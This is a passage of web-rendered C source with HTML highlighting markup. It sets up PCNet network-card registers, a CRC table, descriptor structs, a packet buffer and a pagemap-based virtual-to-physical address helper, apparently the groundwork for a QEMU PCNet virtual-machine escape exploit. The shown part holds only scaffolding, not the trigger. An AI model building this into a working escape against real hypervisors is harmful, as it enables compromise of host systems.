</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;arpa/inet.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/io.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// page relevant
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define PAGE_SHIFT 12
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)
</span></span></span><span class=line><span class=cl><span class=cp>#define PFN_PRESENT (1ULL &lt;&lt; 63)
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_PFN ((1ULL &lt;&lt; 55) - 1)
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_MASK ((1 &lt;&lt; PAGE_SHIFT) - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PAGE_ALIGNED __attribute__((aligned(PAGE_SIZE)))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PCNET_PORT 0xc140
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PCNET_BUFFER_SIZE 4096
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define DRX     0x0001
</span></span></span><span class=line><span class=cl><span class=cp>#define DTX     0x0002
</span></span></span><span class=line><span class=cl><span class=cp>#define LOOP    0x0004
</span></span></span><span class=line><span class=cl><span class=cp>#define DXMTFCS 0x0008
</span></span></span><span class=line><span class=cl><span class=cp>#define INTL    0x0040
</span></span></span><span class=line><span class=cl><span class=cp>#define DRCVPA  0x2000
</span></span></span><span class=line><span class=cl><span class=cp>#define DRCVBC  0x4000
</span></span></span><span class=line><span class=cl><span class=cp>#define PROM    0x8000
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>pcnet_register</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>RDP</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RAP</span> <span class=o>=</span> <span class=mh>0x12</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RST</span> <span class=o>=</span> <span class=mh>0x14</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define CRC(crc, ch) (crc = (crc &gt;&gt; 8) ^ crctab[(crc ^ (ch)) &amp; 0xff])
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* generated using the AUTODIN II polynomial
</span></span></span><span class=line><span class=cl><span class=cm> *	x^32 + x^26 + x^23 + x^22 + x^16 +
</span></span></span><span class=line><span class=cl><span class=cm> *	x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=kt>uint32_t</span> <span class=n>crctab</span><span class=p>[</span><span class=mi>256</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x00000000</span><span class=p>,</span> <span class=mh>0x77073096</span><span class=p>,</span> <span class=mh>0xee0e612c</span><span class=p>,</span> <span class=mh>0x990951ba</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x076dc419</span><span class=p>,</span> <span class=mh>0x706af48f</span><span class=p>,</span> <span class=mh>0xe963a535</span><span class=p>,</span> <span class=mh>0x9e6495a3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x0edb8832</span><span class=p>,</span> <span class=mh>0x79dcb8a4</span><span class=p>,</span> <span class=mh>0xe0d5e91e</span><span class=p>,</span> <span class=mh>0x97d2d988</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x09b64c2b</span><span class=p>,</span> <span class=mh>0x7eb17cbd</span><span class=p>,</span> <span class=mh>0xe7b82d07</span><span class=p>,</span> <span class=mh>0x90bf1d91</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x1db71064</span><span class=p>,</span> <span class=mh>0x6ab020f2</span><span class=p>,</span> <span class=mh>0xf3b97148</span><span class=p>,</span> <span class=mh>0x84be41de</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x1adad47d</span><span class=p>,</span> <span class=mh>0x6ddde4eb</span><span class=p>,</span> <span class=mh>0xf4d4b551</span><span class=p>,</span> <span class=mh>0x83d385c7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x136c9856</span><span class=p>,</span> <span class=mh>0x646ba8c0</span><span class=p>,</span> <span class=mh>0xfd62f97a</span><span class=p>,</span> <span class=mh>0x8a65c9ec</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x14015c4f</span><span class=p>,</span> <span class=mh>0x63066cd9</span><span class=p>,</span> <span class=mh>0xfa0f3d63</span><span class=p>,</span> <span class=mh>0x8d080df5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x3b6e20c8</span><span class=p>,</span> <span class=mh>0x4c69105e</span><span class=p>,</span> <span class=mh>0xd56041e4</span><span class=p>,</span> <span class=mh>0xa2677172</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x3c03e4d1</span><span class=p>,</span> <span class=mh>0x4b04d447</span><span class=p>,</span> <span class=mh>0xd20d85fd</span><span class=p>,</span> <span class=mh>0xa50ab56b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x35b5a8fa</span><span class=p>,</span> <span class=mh>0x42b2986c</span><span class=p>,</span> <span class=mh>0xdbbbc9d6</span><span class=p>,</span> <span class=mh>0xacbcf940</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x32d86ce3</span><span class=p>,</span> <span class=mh>0x45df5c75</span><span class=p>,</span> <span class=mh>0xdcd60dcf</span><span class=p>,</span> <span class=mh>0xabd13d59</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x26d930ac</span><span class=p>,</span> <span class=mh>0x51de003a</span><span class=p>,</span> <span class=mh>0xc8d75180</span><span class=p>,</span> <span class=mh>0xbfd06116</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x21b4f4b5</span><span class=p>,</span> <span class=mh>0x56b3c423</span><span class=p>,</span> <span class=mh>0xcfba9599</span><span class=p>,</span> <span class=mh>0xb8bda50f</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x2802b89e</span><span class=p>,</span> <span class=mh>0x5f058808</span><span class=p>,</span> <span class=mh>0xc60cd9b2</span><span class=p>,</span> <span class=mh>0xb10be924</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x2f6f7c87</span><span class=p>,</span> <span class=mh>0x58684c11</span><span class=p>,</span> <span class=mh>0xc1611dab</span><span class=p>,</span> <span class=mh>0xb6662d3d</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x76dc4190</span><span class=p>,</span> <span class=mh>0x01db7106</span><span class=p>,</span> <span class=mh>0x98d220bc</span><span class=p>,</span> <span class=mh>0xefd5102a</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x71b18589</span><span class=p>,</span> <span class=mh>0x06b6b51f</span><span class=p>,</span> <span class=mh>0x9fbfe4a5</span><span class=p>,</span> <span class=mh>0xe8b8d433</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x7807c9a2</span><span class=p>,</span> <span class=mh>0x0f00f934</span><span class=p>,</span> <span class=mh>0x9609a88e</span><span class=p>,</span> <span class=mh>0xe10e9818</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x7f6a0dbb</span><span class=p>,</span> <span class=mh>0x086d3d2d</span><span class=p>,</span> <span class=mh>0x91646c97</span><span class=p>,</span> <span class=mh>0xe6635c01</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x6b6b51f4</span><span class=p>,</span> <span class=mh>0x1c6c6162</span><span class=p>,</span> <span class=mh>0x856530d8</span><span class=p>,</span> <span class=mh>0xf262004e</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x6c0695ed</span><span class=p>,</span> <span class=mh>0x1b01a57b</span><span class=p>,</span> <span class=mh>0x8208f4c1</span><span class=p>,</span> <span class=mh>0xf50fc457</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x65b0d9c6</span><span class=p>,</span> <span class=mh>0x12b7e950</span><span class=p>,</span> <span class=mh>0x8bbeb8ea</span><span class=p>,</span> <span class=mh>0xfcb9887c</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x62dd1ddf</span><span class=p>,</span> <span class=mh>0x15da2d49</span><span class=p>,</span> <span class=mh>0x8cd37cf3</span><span class=p>,</span> <span class=mh>0xfbd44c65</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x4db26158</span><span class=p>,</span> <span class=mh>0x3ab551ce</span><span class=p>,</span> <span class=mh>0xa3bc0074</span><span class=p>,</span> <span class=mh>0xd4bb30e2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x4adfa541</span><span class=p>,</span> <span class=mh>0x3dd895d7</span><span class=p>,</span> <span class=mh>0xa4d1c46d</span><span class=p>,</span> <span class=mh>0xd3d6f4fb</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x4369e96a</span><span class=p>,</span> <span class=mh>0x346ed9fc</span><span class=p>,</span> <span class=mh>0xad678846</span><span class=p>,</span> <span class=mh>0xda60b8d0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x44042d73</span><span class=p>,</span> <span class=mh>0x33031de5</span><span class=p>,</span> <span class=mh>0xaa0a4c5f</span><span class=p>,</span> <span class=mh>0xdd0d7cc9</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x5005713c</span><span class=p>,</span> <span class=mh>0x270241aa</span><span class=p>,</span> <span class=mh>0xbe0b1010</span><span class=p>,</span> <span class=mh>0xc90c2086</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x5768b525</span><span class=p>,</span> <span class=mh>0x206f85b3</span><span class=p>,</span> <span class=mh>0xb966d409</span><span class=p>,</span> <span class=mh>0xce61e49f</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x5edef90e</span><span class=p>,</span> <span class=mh>0x29d9c998</span><span class=p>,</span> <span class=mh>0xb0d09822</span><span class=p>,</span> <span class=mh>0xc7d7a8b4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x59b33d17</span><span class=p>,</span> <span class=mh>0x2eb40d81</span><span class=p>,</span> <span class=mh>0xb7bd5c3b</span><span class=p>,</span> <span class=mh>0xc0ba6cad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xedb88320</span><span class=p>,</span> <span class=mh>0x9abfb3b6</span><span class=p>,</span> <span class=mh>0x03b6e20c</span><span class=p>,</span> <span class=mh>0x74b1d29a</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xead54739</span><span class=p>,</span> <span class=mh>0x9dd277af</span><span class=p>,</span> <span class=mh>0x04db2615</span><span class=p>,</span> <span class=mh>0x73dc1683</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xe3630b12</span><span class=p>,</span> <span class=mh>0x94643b84</span><span class=p>,</span> <span class=mh>0x0d6d6a3e</span><span class=p>,</span> <span class=mh>0x7a6a5aa8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xe40ecf0b</span><span class=p>,</span> <span class=mh>0x9309ff9d</span><span class=p>,</span> <span class=mh>0x0a00ae27</span><span class=p>,</span> <span class=mh>0x7d079eb1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xf00f9344</span><span class=p>,</span> <span class=mh>0x8708a3d2</span><span class=p>,</span> <span class=mh>0x1e01f268</span><span class=p>,</span> <span class=mh>0x6906c2fe</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xf762575d</span><span class=p>,</span> <span class=mh>0x806567cb</span><span class=p>,</span> <span class=mh>0x196c3671</span><span class=p>,</span> <span class=mh>0x6e6b06e7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xfed41b76</span><span class=p>,</span> <span class=mh>0x89d32be0</span><span class=p>,</span> <span class=mh>0x10da7a5a</span><span class=p>,</span> <span class=mh>0x67dd4acc</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xf9b9df6f</span><span class=p>,</span> <span class=mh>0x8ebeeff9</span><span class=p>,</span> <span class=mh>0x17b7be43</span><span class=p>,</span> <span class=mh>0x60b08ed5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xd6d6a3e8</span><span class=p>,</span> <span class=mh>0xa1d1937e</span><span class=p>,</span> <span class=mh>0x38d8c2c4</span><span class=p>,</span> <span class=mh>0x4fdff252</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xd1bb67f1</span><span class=p>,</span> <span class=mh>0xa6bc5767</span><span class=p>,</span> <span class=mh>0x3fb506dd</span><span class=p>,</span> <span class=mh>0x48b2364b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xd80d2bda</span><span class=p>,</span> <span class=mh>0xaf0a1b4c</span><span class=p>,</span> <span class=mh>0x36034af6</span><span class=p>,</span> <span class=mh>0x41047a60</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xdf60efc3</span><span class=p>,</span> <span class=mh>0xa867df55</span><span class=p>,</span> <span class=mh>0x316e8eef</span><span class=p>,</span> <span class=mh>0x4669be79</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xcb61b38c</span><span class=p>,</span> <span class=mh>0xbc66831a</span><span class=p>,</span> <span class=mh>0x256fd2a0</span><span class=p>,</span> <span class=mh>0x5268e236</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xcc0c7795</span><span class=p>,</span> <span class=mh>0xbb0b4703</span><span class=p>,</span> <span class=mh>0x220216b9</span><span class=p>,</span> <span class=mh>0x5505262f</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xc5ba3bbe</span><span class=p>,</span> <span class=mh>0xb2bd0b28</span><span class=p>,</span> <span class=mh>0x2bb45a92</span><span class=p>,</span> <span class=mh>0x5cb36a04</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xc2d7ffa7</span><span class=p>,</span> <span class=mh>0xb5d0cf31</span><span class=p>,</span> <span class=mh>0x2cd99e8b</span><span class=p>,</span> <span class=mh>0x5bdeae1d</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x9b64c2b0</span><span class=p>,</span> <span class=mh>0xec63f226</span><span class=p>,</span> <span class=mh>0x756aa39c</span><span class=p>,</span> <span class=mh>0x026d930a</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x9c0906a9</span><span class=p>,</span> <span class=mh>0xeb0e363f</span><span class=p>,</span> <span class=mh>0x72076785</span><span class=p>,</span> <span class=mh>0x05005713</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x95bf4a82</span><span class=p>,</span> <span class=mh>0xe2b87a14</span><span class=p>,</span> <span class=mh>0x7bb12bae</span><span class=p>,</span> <span class=mh>0x0cb61b38</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x92d28e9b</span><span class=p>,</span> <span class=mh>0xe5d5be0d</span><span class=p>,</span> <span class=mh>0x7cdcefb7</span><span class=p>,</span> <span class=mh>0x0bdbdf21</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x86d3d2d4</span><span class=p>,</span> <span class=mh>0xf1d4e242</span><span class=p>,</span> <span class=mh>0x68ddb3f8</span><span class=p>,</span> <span class=mh>0x1fda836e</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x81be16cd</span><span class=p>,</span> <span class=mh>0xf6b9265b</span><span class=p>,</span> <span class=mh>0x6fb077e1</span><span class=p>,</span> <span class=mh>0x18b74777</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x88085ae6</span><span class=p>,</span> <span class=mh>0xff0f6a70</span><span class=p>,</span> <span class=mh>0x66063bca</span><span class=p>,</span> <span class=mh>0x11010b5c</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0x8f659eff</span><span class=p>,</span> <span class=mh>0xf862ae69</span><span class=p>,</span> <span class=mh>0x616bffd3</span><span class=p>,</span> <span class=mh>0x166ccf45</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xa00ae278</span><span class=p>,</span> <span class=mh>0xd70dd2ee</span><span class=p>,</span> <span class=mh>0x4e048354</span><span class=p>,</span> <span class=mh>0x3903b3c2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xa7672661</span><span class=p>,</span> <span class=mh>0xd06016f7</span><span class=p>,</span> <span class=mh>0x4969474d</span><span class=p>,</span> <span class=mh>0x3e6e77db</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xaed16a4a</span><span class=p>,</span> <span class=mh>0xd9d65adc</span><span class=p>,</span> <span class=mh>0x40df0b66</span><span class=p>,</span> <span class=mh>0x37d83bf0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xa9bcae53</span><span class=p>,</span> <span class=mh>0xdebb9ec5</span><span class=p>,</span> <span class=mh>0x47b2cf7f</span><span class=p>,</span> <span class=mh>0x30b5ffe9</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xbdbdf21c</span><span class=p>,</span> <span class=mh>0xcabac28a</span><span class=p>,</span> <span class=mh>0x53b39330</span><span class=p>,</span> <span class=mh>0x24b4a3a6</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xbad03605</span><span class=p>,</span> <span class=mh>0xcdd70693</span><span class=p>,</span> <span class=mh>0x54de5729</span><span class=p>,</span> <span class=mh>0x23d967bf</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xb3667a2e</span><span class=p>,</span> <span class=mh>0xc4614ab8</span><span class=p>,</span> <span class=mh>0x5d681b02</span><span class=p>,</span> <span class=mh>0x2a6f2b94</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=mh>0xb40bbe37</span><span class=p>,</span> <span class=mh>0xc30c8ea1</span><span class=p>,</span> <span class=mh>0x5a05df1b</span><span class=p>,</span> <span class=mh>0x2d02ef8d</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>pcnet_config32</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint16_t</span>  <span class=n>mode</span><span class=p>;</span>      <span class=cm>/* working mode: promiscusous, looptest, etc. */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>   <span class=n>rlen</span><span class=p>;</span>      <span class=cm>/* number of rx descriptors in log2 base */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>   <span class=n>tlen</span><span class=p>;</span>      <span class=cm>/* number of tx descriptors in log2 base */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>   <span class=n>mac</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>    <span class=cm>/* mac address */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint16_t</span> <span class=n>_reserved</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>   <span class=n>ladr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>   <span class=cm>/* logical address filter */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span>  <span class=n>rx_desc</span><span class=p>;</span>   <span class=cm>/* physical address of rx descriptor buffer */</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span>  <span class=n>tx_desc</span><span class=p>;</span>   <span class=cm>/* physical address of tx descriptor buffer */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>pcnet_desc</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int16_t</span>  <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int8_t</span>   <span class=n>status_1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int8_t</span>   <span class=n>status_2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>misc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>_reserved</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>uint8_t</span> <span class=n>pcnet_packet</span><span class=p>[</span><span class=n>PCNET_BUFFER_SIZE</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>gva_to_gpa</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/proc/self/pagemap&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>pme</span><span class=p>,</span> <span class=n>gfn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=p>((</span><span class=kt>uintptr_t</span><span class=p>)</span><span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>9</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pme</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;pme: 0x%llx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>pme</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PFN_PRESENT</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>gfn</span> <span class=o>=</span> <span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PAGE_PFN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>gfn</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>uintptr_t</span><span class=p>)</span><span class=n>addr</span> <span class=o>&amp;</span> <span class=n>PAGE_MASK</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>int fd;
</span></span></span><span class=line><span class=cl><span class=cm>uint32_t page_offset(uint32_t addr)
</span></span></span><span class=line><span class=cl><span class=cm>{
</span></span></span><span class=line><span class=cl><span class=cm>    return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);
</span></span></span><span class=line><span class=cl><span class=cm>}
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>uint64_t gva_to_gfn(void *addr)
</span></span></span><span class=line><span class=cl><span class=cm>{
</span></span></span><span class=line><span class=cl><span class=cm>	uint64_t pme, gfn;
</span></span></span><span class=line><span class=cl><span class=cm>	size_t offset;
